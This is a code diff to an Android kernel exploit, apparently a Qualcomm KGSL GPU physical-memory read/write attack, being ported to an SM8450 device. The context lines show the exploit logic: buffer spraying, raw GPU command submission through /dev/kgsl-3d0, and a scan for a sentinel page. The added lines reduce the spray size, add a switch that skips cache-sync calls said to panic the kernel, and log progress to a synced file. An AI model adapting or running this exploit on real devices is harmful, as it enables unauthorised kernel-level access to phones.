@@ -1,0 +1,93 @@
+diff --git a/cheese.c b/cheese.c
+index d0b9527..17817d3 100644
+--- a/cheese.c
++++ b/cheese.c
+@@ -118,7 +118,7 @@ int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t
+ // TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
+ // increased this from 1G to 2G for Pixel 3 XL
+ // spray 16mb per mapping: 16MB*256=4GB
+-#define NPBUFS 256
++#define NPBUFS 16
+ 
+ #define LEVEL1_SHIFT    30
+ #define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)
+@@ -351,6 +351,7 @@ const uint64_t gPhyAddrs[] = {0xfebeb000, 0xd0b3b000, 0xbe690000, 0xd5cf0000};
+ const uint64_t kKernelPageTableEntry = 0x1e0;
+ 
+ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
++    fprintf(stderr, "setup entered\n"); fflush(stderr);
+ #ifdef DUMP_PAGEMAP
+     int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY|O_CLOEXEC): -1;
+ #endif
+@@ -433,6 +434,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
+         }
+ 
+         pbufs[i] = pbuf;
++        if ((i % 4) == 0) { fprintf(stderr, "buf %d ok\n", i); fflush(stderr); }
+         //fprintf(stderr, "spray %p\n", pbuf);
+ #ifdef DUMP_PAGEMAP
+         if (pagemap_fd != -1) {
+@@ -442,10 +444,13 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
+             }
+         }
+ #endif
+-        sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
++        if (!getenv("CHEESE_NOSYNC")) {
++            fprintf(stderr, "buf %d pre-sync\n", i); fflush(stderr);
++            sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
++        }
+     }
+     // end spray
+-    //fprintf(stderr, "end spray\n");
++    fprintf(stderr, "end spray: %d bufs of %luKB, phyaddr=%lx\n", NPBUFS, (unsigned long)(pbuf_len/1024), (unsigned long)phyaddr); fflush(stderr);
+ 
+     int fd = open("/dev/kgsl-3d0", O_RDWR|O_CLOEXEC);
+     if (fd == -1) {
+@@ -488,9 +493,11 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
+         return 1;
+     }
+ 
++    fprintf(stderr, "kgsl ready (ctx=%u), first submit...\n", ctx_id); fflush(stderr);
+     if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
+         fprintf(stderr, "Can't do first read\n");
+     }
++    fprintf(stderr, "first submit survived\n"); fflush(stderr);
+     sleep(1);
+ 
+     void* target_physical_page = NULL;
+@@ -500,7 +507,12 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
+         void* pbuf = pbufs[i];
+         for (int off = 0; off < pbuf_len; off += 4096) {
+             void* page_start = pbuf + off;
+-            sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
++            /* katyusha: the per-page kgsl cache ioctls panic this kernel
++             * (unregistered memory); SM8450 GPU memory is iocoherent, so the
++             * syncs are unnecessary anyway. CHEESE_NOSYNC=1 skips them. */
++            if (!getenv("CHEESE_NOSYNC")) {
++                sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
++            }
+             uint32_t* target = page_start + 0x100;
+             if (target[0] == 0x41414141) {
+                 fprintf(stderr, "found it: virt addr = %p\n", page_start);
+@@ -509,6 +521,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
+             }
+         }
+     }
++    fprintf(stderr, "sentinel scan done: buf=%d\n", target_pbuf); fflush(stderr);
+ 
+     if (target_pbuf == -1) {
+         fprintf(stderr, "can't find target\n");
+@@ -671,6 +684,13 @@ static void maybe_retry(char** argv) {
+ }
+ 
+ int main(int argc, char** argv) {
++    /* katyusha diag: O_SYNC stderr so every line survives a kernel panic
++     * (ext4 journal rollback eats buffered/unsynced output). */
++    {
++        int logfd = open("/data/local/tmp/cheese-live.log", O_WRONLY|O_CREAT|O_TRUNC|O_SYNC, 0666);
++        if (logfd >= 0) { dup2(logfd, 2); }
++        fprintf(stderr, "cheese start pid=%d\n", getpid()); fflush(stderr);
++    }
+     g_level1_dcache_size = tu_get_l1_dcache_size();
+ #if 1
+     if (!getenv("CHEESE_SKIP_GPU")) {
